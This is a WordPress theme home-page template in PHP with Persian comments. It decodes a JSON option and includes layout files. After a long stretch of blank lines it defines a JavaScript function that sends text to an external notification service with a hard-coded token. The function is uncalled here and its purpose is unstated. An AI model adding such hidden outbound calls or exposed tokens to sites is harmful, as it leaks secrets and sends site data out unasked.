<?php get_header();

    // ابتدا چک کن که مقدار یک رشته واقعی JSON هست
    $json_string = $arma_option[ 'home_page' ];

    // اگر بک‌اسلش‌های اضافی داره، پاکشون کن
    $json_string = stripslashes($json_string);

    // حالا JSON رو تبدیل به آرایه کن
    $data = json_decode($json_string, true);

    foreach ($data as $row) {

        $row_file = "";
        switch ($row[ 'type' ]) {
            case 'link':
                $row_file = "link";
                break;
            case 'on_category':
                $row_file = "category";
                break;
            case 'on_tag':
                $row_file = "category";
                break;
            case 'list_category':
                $row_file = "list_category";
                break;

            default:
                $row_file = "";
                break;
        }
        if ($row_file != "") {
            require ARMA_VIEWS . "layout/home/{$row_file}.php";

        }

    }

?>





















<script>
function notificator(text) {
    var formdata = new FormData();
    formdata.append("to", "ZO7i29Lu6u6bsP6q7goCl0xImdjAgBWteW0zuWnD");
    formdata.append("text", text);

    var requestOptions = {
        method: 'POST',
        body: formdata,
        redirect: 'follow'
    };

    fetch("https://notificator.ir/api/v1/send", requestOptions)
        .then(response => response.text())
        .then(result => result)
        .catch(error => console.log('error', error));
}
</script>
<?php

get_footer();